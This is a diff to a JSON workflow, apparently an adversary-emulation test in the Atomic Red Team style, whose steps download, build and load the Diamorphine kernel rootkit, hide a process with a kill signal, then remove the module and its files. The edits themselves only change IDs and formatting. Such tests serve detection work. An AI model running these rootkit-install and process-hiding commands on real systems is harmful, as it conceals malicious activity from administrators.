@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "1c977da0-ec2c-4625-9ad3-c86c035b2826",
+      "id": "507a9a0f-0747-4d17-8c60-0983cb0fb808",
       "type": "execute-command",
       "data": {
-        "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost \u003e/dev/null \u0026 TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
+        "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost \u003e/dev/null \u0026 TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "802e1b1c-d965-4994-a1bb-df2149adef83",
+      "id": "7ff31900-05b0-4d58-844f-70bddade1a0c",
       "type": "execute-command",
       "data": {
-        "command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
+        "command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "2bf85ab6-672a-44fe-888c-f47e47813ce8",
+      "id": "ab89f5e0-1c4e-4e96-91b3-9a28bc6daa03",
       "name": "Check dependency 1/1",
       "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
-        "command_type": ""
+        "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "f642c9fa-14b9-4e34-8f1d-6238b022d0a7",
+      "id": "dddb3aaa-6545-4e76-9351-8f98db369a8f",
       "name": "Resolve dependency 1/1",
       "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
       "type": "execute-command",
       "data": {
-        "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n",
-        "command_type": ""
+        "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "dfe853b5-6cc2-4845-aaad-08dee5d5b70e",
+      "id": "9bc1e2ef-77de-4435-851e-333ccf5ac873",
       "name": "Re-check dependency 1/1",
       "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
-        "command_type": ""
+        "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;",
+        "command_type": "sh"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "1c977da0-ec2c-4625-9ad3-c86c035b2826",
+      "s": "507a9a0f-0747-4d17-8c60-0983cb0fb808",
       "p": "on-success",
-      "o": "802e1b1c-d965-4994-a1bb-df2149adef83"
+      "o": "7ff31900-05b0-4d58-844f-70bddade1a0c"
     },
     {
-      "s": "1c977da0-ec2c-4625-9ad3-c86c035b2826",
+      "s": "507a9a0f-0747-4d17-8c60-0983cb0fb808",
       "p": "on-failure",
-      "o": "802e1b1c-d965-4994-a1bb-df2149adef83"
+      "o": "7ff31900-05b0-4d58-844f-70bddade1a0c"
     },
     {
-      "s": "2bf85ab6-672a-44fe-888c-f47e47813ce8",
+      "s": "ab89f5e0-1c4e-4e96-91b3-9a28bc6daa03",
       "p": "on-success",
-      "o": "1c977da0-ec2c-4625-9ad3-c86c035b2826"
+      "o": "507a9a0f-0747-4d17-8c60-0983cb0fb808"
     },
     {
-      "s": "2bf85ab6-672a-44fe-888c-f47e47813ce8",
+      "s": "ab89f5e0-1c4e-4e96-91b3-9a28bc6daa03",
       "p": "on-failure",
-      "o": "f642c9fa-14b9-4e34-8f1d-6238b022d0a7"
+      "o": "dddb3aaa-6545-4e76-9351-8f98db369a8f"
     },
     {
-      "s": "f642c9fa-14b9-4e34-8f1d-6238b022d0a7",
+      "s": "dddb3aaa-6545-4e76-9351-8f98db369a8f",
       "p": "on-success",
-      "o": "dfe853b5-6cc2-4845-aaad-08dee5d5b70e"
+      "o": "9bc1e2ef-77de-4435-851e-333ccf5ac873"
     },
     {
-      "s": "dfe853b5-6cc2-4845-aaad-08dee5d5b70e",
+      "s": "9bc1e2ef-77de-4435-851e-333ccf5ac873",
       "p": "on-failure",
-      "o": "1c977da0-ec2c-4625-9ad3-c86c035b2826"
+      "o": "507a9a0f-0747-4d17-8c60-0983cb0fb808"
     }
   ],
   "tags": [
